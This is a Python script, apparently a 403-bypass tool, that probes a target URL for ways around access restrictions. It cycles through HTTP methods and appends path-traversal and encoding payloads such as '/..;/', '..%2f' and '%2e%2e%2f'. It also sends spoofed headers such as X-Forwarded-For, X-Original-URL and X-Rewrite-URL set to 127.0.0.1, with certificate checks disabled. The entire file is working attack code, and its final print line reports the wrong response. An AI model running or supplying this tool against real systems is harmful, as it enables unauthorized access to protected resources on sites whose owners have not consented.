import requests
import sys
import colorama
import time
from colorama import Fore, Style
import urllib3
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
domain = sys.argv[1]
path = sys.argv[2]
url=domain+path
print(Style.BRIGHT + Fore.RED + "Using different methods " + "\n")
res1=requests.get(url, allow_redirects=False, verify=False, timeout= 5)
print(Style.BRIGHT + Fore.GREEN + "using GET :" + "\t" + Fore.YELLOW + str(res1.status_code) + "\t :" + Fore.YELLOW + str(len(res1.content)))
res2=requests.post(url, allow_redirects=False, verify=False, timeout= 5)
print(Style.BRIGHT + Fore.GREEN +"using POST :" + "\t" + Fore.YELLOW + str(res2.status_code) + "\t :" + Fore.YELLOW + str(len(res2.content)))
res3=requests.head(url, allow_redirects=False, verify=False, timeout= 5)
print(Style.BRIGHT + Fore.GREEN + "using HEAD :" + "\t" + Fore.YELLOW+ str(res3.status_code) + "\t :" + Fore.YELLOW + str(len(res3.content)))
res4=requests.put(url, allow_redirects=False, verify=False, timeout= 5)
print(Style.BRIGHT + Fore.GREEN +"using PUT : "+ "\t" + Fore.YELLOW + str(res4.status_code) + "\t :" + Fore.YELLOW + str(len(res4.content)))
res5=requests.delete(url, allow_redirects=False, verify=False, timeout= 5)
print(Style.BRIGHT + Fore.GREEN +"using DELETE :"+ "\t" + Fore.YELLOW+str(res5.status_code) + "\t :" + Fore.YELLOW + str(len(res5.content)))
res6=requests.patch(url, allow_redirects=False, verify=False, timeout= 5)
print(Style.BRIGHT + Fore.GREEN +"using PATCH :" + "\t" + Fore.YELLOW+ str(res6.status_code) + "\t :" + Fore.YELLOW + str(len(res6.content)))
print(Style.BRIGHT + Fore.RED + "Using payloads at end of URL " + "\n")
payloads = ["/","/*","/%2f/","/./","./.","/*/","?","??","&","#","%","%20","%09","/..;/","../","..%2f","..;/",".././","..%00/","..%0d","..%5c","..%ff/","%2e%2e%2f",".%2e/","%3f","%26","%23",".json"]
for payload in payloads:
	try:
		url2=url+payload
		res7=requests.get(url2, allow_redirects=False , verify=False, timeout=5)
		print(Style.BRIGHT + Fore.GREEN + url2 + " : "+ Fore.YELLOW + str(res7.status_code) + " : [CL] : " +Fore.YELLOW + str(len(res7.content)))
	except:
		pass
print(Style.BRIGHT + Fore.RED + "Using different headers " + "\n")		
res8=requests.get(url, headers={'X-Forwarded-For':'127.0.0.1'} , allow_redirects=False ,  verify=False)		
print(Style.BRIGHT + Fore.GREEN + "X-Forwarded-For" + " : "+ Fore.YELLOW + str(res8.status_code)+ "\t :" + Fore.YELLOW + str(len(res8.content)))

res9=requests.get(url, headers={'X-Forwarded-Host':'127.0.0.1'} , allow_redirects=False ,  verify=False)		
print(Style.BRIGHT + Fore.GREEN + "X-Forwarded-Host" + " : "+ Fore.YELLOW + str(res9.status_code)+ "\t :" + Fore.YELLOW + str(len(res9.content)))

res10=requests.get(url, headers={'X-Host':'127.0.0.1'} , allow_redirects=False ,  verify=False)		
print(Style.BRIGHT + Fore.GREEN + "X-Host" + " : "+ Fore.YELLOW + str(res10.status_code)+ "\t :" + Fore.YELLOW + str(len(res10.content)))

res11=requests.get(url, headers={'X-Custom-IP-Authorization':'127.0.0.1'} , allow_redirects=False ,  verify=False)		
print(Style.BRIGHT + Fore.GREEN + "X-Custom-IP-Authorization" + " : "+ Fore.YELLOW + str(res11.status_code)+ "\t :" + Fore.YELLOW + str(len(res11.content)))

res12=requests.get(url, headers={'X-Original-URL':'127.0.0.1'} , allow_redirects=False ,  verify=False)		
print(Style.BRIGHT + Fore.GREEN + "X-Original-URL" + " : "+ Fore.YELLOW + str(res12.status_code)+ "\t :" + Fore.YELLOW + str(len(res12.content)))

res13=requests.get(url, headers={'X-Originating-IP':'127.0.0.1'} , allow_redirects=False ,  verify=False)		
print(Style.BRIGHT + Fore.GREEN + "X-Originating-IP" + " : "+ Fore.YELLOW + str(res13.status_code)+ "\t :" + Fore.YELLOW + str(len(res13.content)))

res14=requests.get(url, headers={'X-Remote-IP':'127.0.0.1'} , allow_redirects=False ,  verify=False)		
print(Style.BRIGHT + Fore.GREEN + "X-Remote-IP" + " : "+ Fore.YELLOW + str(res14.status_code)+ "\t :" + Fore.YELLOW + str(len(res14.content)))

url3=domain+"/dev/null"
url4=domain+path
res15=requests.get(url3, headers={'X-Rewrite-URL':url4} , allow_redirects=False ,  verify=False)		
print(Style.BRIGHT + Fore.GREEN + "X-Rewrite-URL" + " : "+ Fore.YELLOW + str(res15.status_code)+ "\t :" + Fore.YELLOW + str(len(res15.content)))

#Custom header
res16=requests.get(url, headers={'X-Custom-IP-Authorization:':'LOCALHOST.LOCAL'} , allow_redirects=False ,  verify=False)		
print(Style.BRIGHT + Fore.GREEN + "X-Custom-IP-Authorization:" + " : "+ Fore.YELLOW + str(res14.status_code)+ "\t :" + Fore.YELLOW + str(len(res16.content)))

#Change color as per your preference
print(Style.BRIGHT + Fore.WHITE + "finished automating . begin manual check . good luck " + "\n")
